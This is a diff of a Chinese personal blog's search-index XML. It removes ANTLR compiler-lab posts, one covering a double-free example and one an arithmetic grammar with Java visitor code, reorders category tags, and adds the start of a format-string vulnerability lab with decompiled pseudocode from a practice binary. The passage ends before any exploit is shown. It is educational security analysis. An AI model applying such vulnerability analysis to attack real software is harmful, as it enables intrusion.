-<p>紧接着 <code>free</code> 掉它们 <img data-src="/2019/06/09/experiments/antlr-2/5.png" class=""></p>
-</li>
-<li>
-<p>为 <code>buf1R2</code> 分配空间，大小为 <code>bufsize1</code></p>
-<img data-src="/2019/06/09/experiments/antlr-2/6.png" class="">
-</li>
-<li>
-<p>把 <code>argv[1]</code> 中的内容复制到 <code>buf1R2</code> 所指空间中 <img data-src="/2019/06/09/experiments/antlr-2/7.png" class=""> <img data-src="/2019/06/09/experiments/antlr-2/8.png" class=""></p>
-</li>
-<li>
-<p>最后的两个 <code>free</code> 语句都在语法分析树的右侧 <img data-src="/2019/06/09/experiments/antlr-2/9.png" class=""></p>
-</li>
-</ol>
-<div class="note primary"><p>从语法分析树中看不出任何问题，因为这个存在漏洞的代码是语法正确的，而且也符合 C 语言语法结构。所以我们在编写相关代码时，要自行检查指针的使用情况，最好在释放指针所指向的空间后，将其置为 <code>NULL</code>。</p>
-</div>
-<h2 id="实验总结">实验总结</h2>
-<p>本实验中通过学习带有漏洞的 C 语言代码，了解到一些常见的二进制相关漏洞，借助到 C 语言的语法规则文件，对漏洞代码进行分解研究，了解到了我们所写的程序通过语法树展开后的样子，并试着提取其规则，编写漏洞描述 xml 文件。</p>
-<p>中途遇到了 IntelliJ IDEA 无法解析规则，找不到 start rule 的问题，后来通过在 cpp14.g4 文件中右击 translationunit 规则，点击 test translationunit rule 找到了语法树的生成点，从而成功在 ANTLR Output 中看到了所生成的语法树。</p>
-]]></content>
-      <categories>
-        <category>实验</category>
-        <category>编译原理</category>
-        <category>漏洞</category>
-        <category>双重释放</category>
-      </categories>
-      <tags>
-        <tag>ANTLR</tag>
-        <tag>编译原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ANTLR 语言识别工具</title>
-    <url>/2019/05/20/experiments/antlr/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
-<ol>
-<li>了解 ANTLR 语言识别工具，安装 ANTLR 环境，熟悉 ANTLR 的使用。</li>
-<li>掌握使用 ANTLR 构建的语法分析器和树解析器分析语言，通过 ANTLR 实现语法分析过程。</li>
-</ol>
-<span id="more"></span>
-<h2 id="实验条件">实验条件</h2>
-<ol>
-<li>Windows 10 专业版</li>
-<li> JDK 1.8 版本（64 位，版本号为 1.8.0_202）</li>
-<li>ANTLR 环境 ——ANTLR 4</li>
-</ol>
-<h2 id="实验内容">实验内容</h2>
-<h3 id="安装ANTLR">安装 ANTLR</h3>
-<p>个人所用的集成开发环境中提供 ANTLR 插件的安装，故可直接进入插件下载功能中下载该插件。运行时环境配置过程和安装过程不再赘述。</p>
-<img data-src="/2019/05/20/experiments/antlr/1.png" class=""> 
-<p>安装以后，下方工具栏会多出两个窗口：ANTLR Preview 和 Tool Output。</p>
-<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/05/20/experiments/antlr/2.png" class="" title="ANTLR Preivew窗口"></div><div class="group-picture-column"><img data-src="/2019/05/20/experiments/antlr/3.png" class="" title="Tool Output窗口"></div></div></div> 
-<p>Preview 中可以显示 Parse tree，从而省去了在控制台中输入 <code>-gui</code> 命令的麻烦。</p>
-<h3 id="使用ANTLR实现实数的四则运算">使用 ANTLR 实现实数的四则运算</h3>
-<div class="note info"><h4 id="要求">要求</h4>
-<p>创建 ANTLR 语法文件 <code>expr.g4</code>，解析如赋值语句 <code>a = 5.5</code> 和表达式 <code>a+4*3÷2-1</code> 这样的语句。</p>
-<ul>
-<li>要验证所编写的文法是否正确，可使用 TestRig 测试语法，在 CMD 中输入 <code>-gui</code> 可直观展示其语法分析树。</li>
-<li>创建 expr 文件（如 test.expr，输入一个表达式）检验程序是否能够正确运行和计算四则算式。</li>
-</ul>
-</div>
-<ol>
-<li>
-<p>文法设计</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">E -&gt; E OP E|VAR = E|E'; E'-&gt; D; OP: [+|-|*|/]; D:[0-9]+; VAR:[a-zA-Z]+; </span><br></pre></td></tr></tbody></table></figure>
-<p>由此编写的 <code>expr.g4</code> 文件如下：（还考虑了一些换行及空格因素）</p>
-<figure class="highlight plaintext"><figcaption><span>expr.g4</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">grammar expr; </span><br><span class="line">exprs : setExpr | calcExpr ; </span><br><span class="line">setExpr : id=ID '=' num=NUMBER ; </span><br><span class="line">calcExpr: calcExpr op=(MUL | DIV) calcExpr | calcExpr op=(ADD | SUB) calcExpr | factor ; </span><br><span class="line">factor: (sign=(ADD | SUB))? num=NUMBER // 计算因子可以是一个正数或负数 </span><br><span class="line">                           | id=ID // 计算因子可以是一个变量 ; </span><br><span class="line">WS : [ \t\n\r]+ -&gt; skip ; </span><br><span class="line">ID : [a-zA-Z]+ ; </span><br><span class="line">NUMBER : [0-9]+('.'([0-9]+)?)? ; </span><br><span class="line">ADD : '+' ; </span><br><span class="line">SUB : '-' ; </span><br><span class="line">MUL : '*' ; </span><br><span class="line">DIV : '/' ; </span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li>
-<p>运行结果</p>
-</li>
-</ol>
-<div class="tabs" id="results"><ul class="nav-tabs"><li class="tab active"><a href="#results-1">赋值语句</a></li><li class="tab"><a href="#results-2">不完整的式子</a></li><li class="tab"><a href="#results-3">一个正常的运算式</a></li><li class="tab"><a href="#results-4">异常处理</a></li></ul><div class="tab-content"><div class="tab-pane active" id="results-1"><p>控制台工具显示如下<br>
-<img data-src="/2019/05/20/experiments/antlr/res1-1.png" class=""></p>
-<p>Main 函数如下</p>
-<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line marked"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>{ </span><br><span class="line">	<span class="type">String</span> <span class="variable">input_string</span> <span class="operator">=</span> <span class="string">"a=5.5"</span>;</span><br><span class="line">	<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> System.in; </span><br><span class="line">	<span class="keyword">try</span>{ </span><br><span class="line">		<span class="type">ANTLRInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ANTLRInputStream</span>(input_string); </span><br><span class="line">		<span class="type">exprLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprLexer</span>(input); </span><br><span class="line">		<span class="type">CommonTokenStream</span> <span class="variable">tokens</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonTokenStream</span>(lexer); </span><br><span class="line">		<span class="type">exprParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprParser</span>(tokens);</span><br><span class="line">		<span class="type">ParseTree</span> <span class="variable">tree</span> <span class="operator">=</span> parser.exprs(); </span><br><span class="line">		<span class="type">Visitor</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Visitor</span>(); </span><br><span class="line">		System.out.println(visitor.visit(tree)); </span><br><span class="line">	} <span class="keyword">catch</span>(IOException ioe){ </span><br><span class="line">		ioe.printStackTrace(); </span><br><span class="line">	} </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
-<p>运行结果如下<br>
-<img data-src="/2019/05/20/experiments/antlr/res1-2.png" class="" title="在visitSetExpr时触发了其中的打印操作，外层返回值为null"></p></div><div class="tab-pane" id="results-2"><div class="note "><p>本次测试的式子为 <code>a+4*3/2-1</code></p>
-</div>
-<p>控制台工具显示如下<br>
-<img data-src="/2019/05/20/experiments/antlr/res2-1.png" class=""></p>
-<p>Main 函数如下</p>
-<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line marked"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>{ </span><br><span class="line">	<span class="type">String</span> <span class="variable">input_string</span> <span class="operator">=</span> <span class="string">"a+4*3/2-1"</span>;</span><br><span class="line">	<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> System.in; </span><br><span class="line">	<span class="keyword">try</span>{ </span><br><span class="line">		<span class="type">ANTLRInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ANTLRInputStream</span>(input_string); </span><br><span class="line">		<span class="type">exprLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprLexer</span>(input); </span><br><span class="line">		<span class="type">CommonTokenStream</span> <span class="variable">tokens</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonTokenStream</span>(lexer); </span><br><span class="line">		<span class="type">exprParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exprParser</span>(tokens);</span><br><span class="line">		<span class="type">ParseTree</span> <span class="variable">tree</span> <span class="operator">=</span> parser.exprs(); </span><br><span class="line">		<span class="type">Visitor</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Visitor</span>(); </span><br><span class="line">		System.out.println(visitor.visit(tree)); </span><br><span class="line">	} <span class="keyword">catch</span>(IOException ioe){ </span><br><span class="line">		ioe.printStackTrace(); </span><br><span class="line">	} </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure>
-<img data-src="/2019/05/20/experiments/antlr/res2-2.png" class="" title="为了方便，在每个函数的visit函数外层加了一个控制台打印输出"> 
-从输出来看，对语法树的遍历过程几乎遍及了句子的每一个结点。由于最后得到的句型是一个类似于 <code>a + &lt;数字&gt;</code> 的格式，所以它输出 <code>NaN</code>，与预期一致。
-<div class="note warning"><p><code>a</code> 是与前一个赋值语句分开输入的，所以它并没有被定义值</p>
-</div></div><div class="tab-pane" id="results-3"><div class="note "><p>本次测试的式子为 <code>1+4.5*2-3/3</code></p>
-</div>
-<p>Main 函数代码类似，控制台工具显示如下<br>
-<img data-src="/2019/05/20/experiments/antlr/res3-1.png" class="" title="分析树的结构与预期一致"></p>
-<p>代码输出结果如下<br>
-<img data-src="/2019/05/20/experiments/antlr/res3-2.png" class=""><br>
-得到了正确的输出结果，证明我们写的语法解析是正确的。</p></div><div class="tab-pane" id="results-4"><ol>
-<li>针对除 0 错误，程序可以顺利显示出 <code>Infinity</code>，没有中断程序<br>
-<img data-src="/2019/05/20/experiments/antlr/res4-1.png" class=""></li>
-<li>输入过长也不会中断程序<br>
-<img data-src="/2019/05/20/experiments/antlr/res4-2.png" class=""></li>
-<li>符号错误需要单独处理<br>
-<img data-src="/2019/05/20/experiments/antlr/res4-3.png" class="" title="报错：不被识别的字符（本例输入了分号），需要一个ID，NUMBER，加号或减号"></li>
-</ol>
-<div class="note warning"><p>这说明符号错误需要单独处理，java 中可以使用 try-catch 来完成这项工作。除此之外，也可从前端角度考虑，提前检验用户输入。</p>
-</div></div></div></div>
-<h2 id="总结">总结</h2>
-<p>这个解析过程是怎么实现的呢？</p>
-<ul>
-<li>在生成 ANTLR 识别文件时，实际上生成了很多个 java 和 token 源文件。</li>
-</ul>
-<img data-src="/2019/05/20/experiments/antlr/end1.png" class="">
-<img data-src="/2019/05/20/experiments/antlr/end2.png" class="">
-<ul>
-<li>
-<p>有两个 tokens 文件和六个 java 文件，<code>Listener</code> 和 <code>Visitor</code> 是两个接口，<code>Listener</code> 中定义了一些退出或进入一个表达式中所进行的语法动作，<code>Visitor</code> 中定义了遍历语法树中项目的返回动作，一个语法项对应一个 <code>visit</code> 函数。具体由 <code>xxBaseListener</code> 或 <code>xxBaseVisitor</code> 来实现。默认状态下，所有的实现都是空的，我们可以扩展 <code>xxBase[Listener|Visitor]</code> 类，自己定义语法动作。本实验中，只需要实现 <code>Visitor</code> 的内容即可，不过由于上下文的关系，我们需要自建一个 <code>Context</code> 类，负责上下文内容的保存和识别。</p>
-</li>
-<li>
-<p>重写 <code>visit</code> 函数：</p>
-  <figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;你需要的返回值&gt; visit&lt;A&gt;(xxParser.&lt;A&gt;Context ctx)</span><br></pre></td></tr></tbody></table></figure>
-</li>
-<li>
-<p>.tokens 文件中将语法常量对应了一个整数数值，方便常量的建立。.interp 文件则记录了字面值。</p>
-</li>
-<li>
-<p>Parser 中，对每一个语法变量，生成了很多上下文相关的方法（xxContext）。其中的某些常量在前面所述的.tokens 文件中可以找到。</p>
-</li>
-<li>
-<p>Lexer 中，则存储了字面量及其相关方法，某些内容可在.interp 文件中找到。</p>
-</li>
-<li>
-<p>而所有开头的 xx 来自于语法文件第一行的 grammar xx，即为语法名。</p>
-</li>
-<li>
-<p><code>Visitor</code> 实现完成后，在主函数中建立 <code>visitor</code> 对象，调用 <code>visit</code> 语法树方法，将用户输入作为参数传入，其返回值即为语法分析结果。</p>
-</li>
-</ul>
-<figure class="highlight java"><figcaption><span>visitor.java</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Visitor</span> <span class="keyword">extends</span> <span class="title class_">exprBaseVisitor</span>&lt;Double&gt;{</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitExprs</span><span class="params">(exprParser.ExprsContext ctx)</span>{ </span><br><span class="line">		<span class="comment">//System.out.println("visit exprs"); </span></span><br><span class="line">		<span class="keyword">return</span> visit(ctx.getChild(<span class="number">0</span>)); </span><br><span class="line">	}</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitSetExpr</span><span class="params">(exprParser.SetExprContext ctx)</span>{</span><br><span class="line">		Context.getInstance().setContext(ctx.id.getText(), ctx.num.getText());</span><br><span class="line">		System.out.println(<span class="string">"Assign operation in current line:"</span> + ctx.id.getText() + <span class="string">" = "</span> + ctx.num.getText());</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">	}</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitCalcExpr</span><span class="params">(exprParser.CalcExprContext ctx)</span>{ </span><br><span class="line">		<span class="comment">//System.out.println("visit calc expr "); </span></span><br><span class="line">		<span class="type">int</span> <span class="variable">cc</span> <span class="operator">=</span> ctx.getChildCount(); </span><br><span class="line">		<span class="keyword">if</span> (cc == <span class="number">3</span>) { </span><br><span class="line">			<span class="keyword">switch</span> (ctx.op.getType()) { </span><br><span class="line">				<span class="keyword">case</span> exprParser.ADD:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) + visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">				<span class="keyword">case</span> exprParser.SUB:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) - visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">				<span class="keyword">case</span> exprParser.MUL:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) * visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">				<span class="keyword">case</span> exprParser.DIV:</span><br><span class="line">					<span class="keyword">return</span> visit(ctx.calcExpr(<span class="number">0</span>)) / visit(ctx.calcExpr(<span class="number">1</span>));</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cc == <span class="number">1</span>)</span><br><span class="line">		{</span><br><span class="line">			<span class="keyword">return</span> visit(ctx.getChild(<span class="number">0</span>));</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">	}</span><br><span class="line">	<span class="meta">@Override</span> </span><br><span class="line">	<span class="keyword">public</span> Double <span class="title function_">visitFactor</span><span class="params">(exprParser.FactorContext ctx)</span>{ </span><br><span class="line">		<span class="comment">//System.out.println("visit factor"); </span></span><br><span class="line">		<span class="type">int</span> <span class="variable">cc</span> <span class="operator">=</span> ctx.getChildCount(); </span><br><span class="line">		<span class="keyword">if</span> (cc == <span class="number">3</span>) { </span><br><span class="line">			<span class="keyword">return</span> visit(ctx.getChild(<span class="number">1</span>)); </span><br><span class="line">		} <span class="keyword">else</span> <span class="keyword">if</span> (cc == <span class="number">2</span>) { </span><br><span class="line">			<span class="keyword">if</span> (ctx.sign.getType() == exprParser.ADD)</span><br><span class="line">				<span class="keyword">return</span> Double.valueOf(ctx.getChild(<span class="number">1</span>).getText());</span><br><span class="line">			<span class="keyword">if</span>(ctx.sign.getType() == exprParser.SUB) </span><br><span class="line">				<span class="keyword">return</span> -<span class="number">1</span> * Double.valueOf(ctx.getChild(<span class="number">1</span>).getText());</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(cc == <span class="number">1</span>){</span><br><span class="line">			<span class="keyword">if</span>(ctx.num != <span class="literal">null</span>) <span class="keyword">return</span> Double.valueOf(ctx.getChild(<span class="number">0</span>).getText());</span><br><span class="line">			<span class="keyword">if</span>(ctx.id != <span class="literal">null</span>) <span class="keyword">return</span> Context.getInstance().getValue(ctx.id.getText());</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>();</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-<ul>
-<li>目前实现的版本中，可以正确地进行运算，但还没有实现连续赋值功能，也没有考虑到多语句的分隔及分开解析，例如输入 <code>"a=1 a+1"</code> 后不能得到 <code>2</code>，可能需要修改 <code>Context</code> 类和 <code>Visitor</code> 类中的代码，使其可以记录上下文信息，将 <code>a</code> 的值存入暂存区。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>实验</category>
-        <category>编译原理</category>
-      </categories>
-      <tags>
-        <tag>ANTLR</tag>
-        <tag>编译原理</tag>
       </tags>
   </entry>
   <entry>
@@ -3501,8 +3501,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>移动终端安全</category>
         <category>漏洞</category>
+        <category>移动终端安全</category>
         <category>Android</category>
       </categories>
       <tags>
@@ -3925,8 +3925,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>软件安全</category>
         <category>漏洞</category>
+        <category>软件安全</category>
         <category>缓冲区溢出</category>
         <category>二进制</category>
       </categories>
@@ -4041,8 +4041,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>软件安全</category>
         <category>漏洞</category>
+        <category>软件安全</category>
         <category>拒绝服务</category>
       </categories>
       <tags>
@@ -4157,8 +4157,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>软件安全</category>
         <category>漏洞</category>
+        <category>软件安全</category>
         <category>shellcode注入</category>
       </categories>
       <tags>
@@ -4302,8 +4302,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>软件安全</category>
         <category>漏洞</category>
+        <category>软件安全</category>
         <category>栈溢出</category>
       </categories>
       <tags>
@@ -4418,8 +4418,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>软件安全</category>
         <category>漏洞</category>
+        <category>软件安全</category>
         <category>格式化字符串</category>
       </categories>
       <tags>
@@ -4502,8 +4502,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>软件安全</category>
         <category>漏洞</category>
+        <category>软件安全</category>
         <category>SEH</category>
         <category>虚函数</category>
       </categories>
@@ -4663,8 +4663,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>信息系统</category>
         <category>漏洞</category>
+        <category>信息系统</category>
         <category>DDoS攻击</category>
       </categories>
       <tags>
@@ -4836,8 +4836,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>信息系统</category>
         <category>漏洞</category>
+        <category>信息系统</category>
         <category>Tomcat配置</category>
       </categories>
       <tags>
@@ -5012,8 +5012,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>信息系统</category>
         <category>漏洞</category>
+        <category>信息系统</category>
         <category>SQL注入</category>
       </categories>
       <tags>
@@ -5119,8 +5119,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>漏洞分析</category>
         <category>漏洞</category>
+        <category>漏洞分析</category>
         <category>双重释放</category>
         <category>堆溢出</category>
       </categories>
@@ -5230,8 +5230,8 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>漏洞分析</category>
         <category>漏洞</category>
+        <category>漏洞分析</category>
         <category>缓冲区溢出</category>
       </categories>
       <tags>
@@ -5388,10 +5388,106 @@ cp 命令一般用于复制文件或目录。mv 命令一般用于剪切文件�
 ]]></content>
       <categories>
         <category>实验</category>
-        <category>漏洞分析</category>
         <category>漏洞</category>
+        <category>漏洞分析</category>
         <category>缓冲区溢出</category>
         <category>二进制</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>软件安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>格式化字符串漏洞</title>
+    <url>/2019/11/14/experiments/security/vulnerability_analysis/string-format/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
+<p>掌握格式化字符串漏洞的原理以及在漏洞利用中的应用。</p>
+<span id="more"></span>
+<h2 id="步骤">步骤</h2>
+<ol>
+<li>
+<p>运行程序，大概走一遍流程 </p><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/2.png" class=""></div></div></div><p></p>
+</li>
+<li>
+<p>首先，程序接受最大 20 字节长的 “用户名” 和 “密码” 传入，注册成功后，会有三个选项：查看信息，修改信息和退出。</p>
+</li>
+<li>
+<p>用 ida 打开程序，搜索相关标志，发现程序首先调用了 <code>sub_4008BB()</code>，它输出了我们看到的 <code>banner</code>，并冲洗了标准输出（通过调用 <code>fflush(stdout)</code>）。 <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/3.png" class=""></p>
+</li>
+<li>
+<p>从 <code>sub4008bb</code> 跟回到 <code>main</code> 函数，发现接下来是一个 “注册” 过程，由 <code>sub_400903</code> 函数负责。</p>
+ <figure class="highlight c"><figcaption><span>sub_400903</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 v12; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Register Account first!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Input your username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v12 = read(<span class="number">0</span>, &amp;bufa, <span class="number">0x14</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v12 &amp;&amp; v12 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;a9 + <span class="number">4</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  LOBYTE(bufa) = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"error length(username)!try again"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> buf;</span><br></pre></td></tr></tbody></table></figure>
+<p>使用 <code>read</code> 函数只将 20 字节数据读入，除此以外，所有的 <code>puts</code> 和 <code>read</code> 后都跟着一个 <code>fflush</code>，强行冲洗缓冲区。看来，缓冲区的毛病应该利用不上了。</p>
+</li>
+<li>
+<p>接下来是 <code>sub_400d2b</code> 函数，这是程序的后半部分 —— 选择输出、修改信息或退出程序。</p>
+ <figure class="highlight c"><figcaption><span>sub_400d2b</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = sub_400A75();</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_400B41((__int64)&amp;sa, <span class="number">0LL</span>, v9, v10, v11);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> sub_400D1A(v7, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_400B07((<span class="type">char</span>)v7, <span class="number">0</span>, v9, v10, v11, v12);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error options"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    v7 = <span class="built_in">stdout</span>;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+<ul>
+<li>其中 <code>sub_400a75</code> 输出了三个选项的内容  <figure class="highlight c"><figcaption><span>sub_400a75</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"1.Sh0w Account Infomation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2.Ed1t Account Inf0mation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3.QUit sangebaimao:("</span>);</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><code>sub_400b41</code>（选择 2）修改已注册用户名的信息  <figure class="highlight c"><figcaption><span>sub_400b41</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"please input new username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v15 = read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v15 &lt;= <span class="number">0</span> || v15 &gt; <span class="number">20</span> )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"len error(max lenth:20)!try again.."</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)s = sa;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;sa, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input new password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span 